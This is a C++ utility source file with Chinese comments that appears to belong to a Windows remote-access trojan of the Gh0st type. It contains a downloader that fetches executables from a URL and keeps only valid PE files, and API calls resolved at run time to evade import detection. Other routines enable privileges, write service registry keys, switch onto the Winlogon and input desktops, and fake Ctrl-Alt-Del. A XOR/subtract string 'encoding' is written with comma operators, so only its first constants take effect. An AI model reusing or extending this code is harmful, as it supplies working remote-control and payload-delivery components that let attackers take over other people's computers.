#include "stdafx.h"
#if !defined(AFX_UNTIL_CPP_INCLUDED)
#define AFX_UNTIL_CPP_INCLUDED

#include <process.h>
#include <wininet.h>
#include <stdio.h>
#include <Tlhelp32.h>
#pragma comment( lib, "wininet.lib" )
#include "until.h"

////////////////////////////////////////////////////////////////////////////////////////////////
DWORD WINAPI ThreadLoader(LPVOID lparam)
{
	unsigned int nRet = 0;
#ifdef _DLL
 	try
 	{
#endif	
		THREAD_ARGLIST arg;
		memcpy(&arg, lparam, sizeof(arg));
		
		SetEvent(arg.hEventTransferArg);
		// 与桌面交互
		if (arg.bInteractive)
		{
			SelectDesktop(NULL);
		}
		nRet = arg.start_address(arg.arglist);
#ifdef _DLL
	}
	catch(...){};
#endif
	return nRet;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	arg.hEventTransferArg = CreateEventA(NULL, false, false, NULL);
	hThread = CreateThread(lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, lpThreadId);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);
	
	return hThread;
}

DWORD GetProcessID(LPCSTR lpProcessName)
{
	HANDLE			hProcessSnap = NULL;
	PROCESSENTRY32	pe32 = {0};
	
	// 获取系统进程快照
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return 0;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	for (BOOL bPE32=Process32First(hProcessSnap, &pe32); bPE32; bPE32=Process32Next(hProcessSnap, &pe32))
	{
		if (stricmp(pe32.szExeFile, lpProcessName) == 0)
		{
			CloseHandle(hProcessSnap);
			return pe32.th32ProcessID;
		}
	}
	CloseHandle(hProcessSnap);
	return 0;
}

char* MyEncode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] ^= 0x19,0x23,0x44,0x57,0x89;
		data[i] -= 0x86,0x76,0x64,0x32,0x14;
	}
	return data;
}

char* MyDecode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] += 0x86,0x76,0x64,0x32,0x14;
		data[i] ^= 0x19,0x23,0x44,0x57,0x89;
	}
	return data;
}

BOOL SelectHDESK(HDESK new_desktop)
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
	DWORD dummy;
	char new_name[256];

	if (!GetUserObjectInformationA(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
		return FALSE;
	}

	// Switch the desktop
	if(!SetThreadDesktop(new_desktop)) {
		return FALSE;
	}

	// Switched successfully - destroy the old desktop
	CloseDesktop(old_desktop);

	return TRUE;
}

BOOL SelectDesktop(char *name)
{
	HDESK desktop;

	if (name != NULL)
	{
		desktop = OpenDesktopA(name, 0, FALSE, 0x1FF);
	}
	else
	{
		desktop = OpenInputDesktop(1, FALSE, 0x1FF);
	}

	if (desktop == NULL)
	{
		return FALSE;
	}

	// Switch to the new desktop
	if (!SelectHDESK(desktop))
	{
		// Failed to enter the new desktop, so free it!
		CloseDesktop(desktop);
		return FALSE;
	}

	// We successfully switched desktops!
	return TRUE;
}

void SetInfo(LPCTSTR lpKeyName, LPCTSTR lpszValueName, LPCTSTR lpServiceName)
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);	
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, lpKeyName, REG_SZ, (char *)lpszValueName, lstrlen(lpszValueName), 0);
}

void DelSetInfo(LPCTSTR lpKeyName, LPCTSTR lpszValueName, LPCTSTR lpServiceName)
{	
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);	
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, lpKeyName, REG_SZ, (char *)lpszValueName, lstrlen(lpszValueName), 3);
}

BOOL SimulateCtrlAltDel()
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());

	// Switch into the Winlogon desktop
	if (!SelectDesktop("Winlogon"))
	{
		return FALSE;
	}

	// Fake a hotkey event to any windows we find there.... :(
	// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
	PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));

	// Switch back to our original desktop
	if (old_desktop != NULL)
		SelectHDESK(old_desktop);

	return TRUE;
}

bool SwitchInputDesktop()
{
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;

	HDESK	hOldDesktop, hNewDesktop;
	char	szOldDesktop[256], szNewDesktop[256];

	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(szOldDesktop, 0, sizeof(szOldDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &szOldDesktop, sizeof(szOldDesktop), &dwLengthNeeded);

	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(szNewDesktop, 0, sizeof(szNewDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &szNewDesktop, sizeof(szNewDesktop), &dwLengthNeeded);

	if (lstrcmpi(szOldDesktop, szNewDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}

	CloseDesktop(hOldDesktop);
	CloseDesktop(hNewDesktop);
	return bRet;
}

BOOL GetCurrentUserName(char *szUserName)
{
	LPSTR lpUserName = NULL;
	DWORD dwUserSize = 0;

	if (WTSQuerySessionInformation(NULL, WTS_CURRENT_SESSION, WTSUserName, &lpUserName, &dwUserSize))
	{
		strcpy(szUserName, lpUserName);
		WTSFreeMemory(lpUserName);
		if (!strlen(szUserName))
		{
			strcpy(szUserName, "无用户登陆状态!");
			return FALSE;
		}
		return TRUE;
	}
	strcpy(szUserName, "无用户登陆状态!");
	return FALSE;
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if ( GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND ) 
		return FALSE;
	else
		return TRUE;
}

bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet = NULL, hUrl = NULL;
	HANDLE		hFile;
	TCHAR		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	bool		bRet = true;

	HINSTANCE hdlldes = LoadLibrary("wininet.dll"); 

	typedef HINTERNET (WINAPI *NETOPEN)(LPCTSTR ,DWORD, LPCTSTR, LPCTSTR ,DWORD) ; 
	NETOPEN myNetOpen= (NETOPEN)GetProcAddress(hdlldes, "InternetOpenA");

	hInternet = myNetOpen("MSIE 6.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);


	if (hInternet == NULL)
	{
		if(hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}

	typedef HINTERNET (WINAPI *NETOPENURL)(HINTERNET ,LPCTSTR ,LPCTSTR ,DWORD ,DWORD ,DWORD_PTR ); 
	NETOPENURL 	myNetOpenUrl= (NETOPENURL)GetProcAddress(hdlldes, "InternetOpenUrlA");

	hUrl = myNetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);

	if (hUrl == NULL)
	{
		if(hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			typedef BOOL (WINAPI *APIS)(HINTERNET ,LPVOID ,DWORD ,LPDWORD ); 
			APIS myapis; 
			myapis= (APIS)GetProcAddress(hdlldes, "InternetReadFile"); 
			myapis(hUrl, buffer, sizeof(buffer), &dwBytesRead);

			// 由判断第一个数据包是不是有效的PE文件
			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
			{
				bRet = false;
				break;
			}
			bIsFirstPacket = false;

			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
		CloseHandle(hFile);
	}


	Sleep(1);
	typedef BOOL (WINAPI *NETCLOSE)(HINTERNET hInternet); 
	NETCLOSE  myNetClose= (NETCLOSE  )GetProcAddress(hdlldes,"InternetCloseHandle"); 

	myNetClose(hUrl);
	myNetClose(hInternet);

	if(hdlldes)
		FreeLibrary(hdlldes);

	return bRet;
}

BOOL DebugPrivilege(const char *PName,BOOL bEnable)
{
	bool              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;


	HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll"); 

	typedef BOOL (WINAPI *OPT)(HANDLE ProcessHandle,DWORD DesiredAccess,PHANDLE TokenHandle); 
	OPT myopt; 
	myopt= (OPT)GetProcAddress(advapi32, "OpenProcessToken"); 

	typedef BOOL (WINAPI *ATP)(HANDLE TokenHandle,BOOL DisableAllPrivileges,PTOKEN_PRIVILEGES NewState,DWORD BufferLength,PTOKEN_PRIVILEGES PreviousState,PDWORD ReturnLength); 
	ATP myapt; 
	myapt= (ATP)GetProcAddress(advapi32, "AdjustTokenPrivileges");

	typedef BOOL (WINAPI *LPV)(LPCTSTR lpSystemName, LPCTSTR lpName,PLUID lpLuid); 
	LPV mylpv;
#ifdef UNICODE
	mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueW");
#else
	mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueA");
#endif

	HINSTANCE kernel32 = LoadLibrary("kernel32.dll"); 
	typedef HANDLE (WINAPI *TGetCurrentProcess)(VOID); 
	TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess"); 


	if (!myopt(myGetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;


	mylpv(NULL, PName, &TokenPrivileges.Privileges[0].Luid);

	myapt(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

	typedef int (WINAPI *GLE)(void); 
	GLE myGetLastError; 
	HINSTANCE hdlxxe = LoadLibrary("KERNEL32.dll"); 
	myGetLastError= (GLE)GetProcAddress(hdlxxe, "GetLastError"); 

	if (myGetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	if(advapi32)
		FreeLibrary(advapi32);
	if(kernel32)
		FreeLibrary(kernel32);
	return bResult;	
}
#endif // !defined(AFX_UNTIL_CPP_INCLUDED)
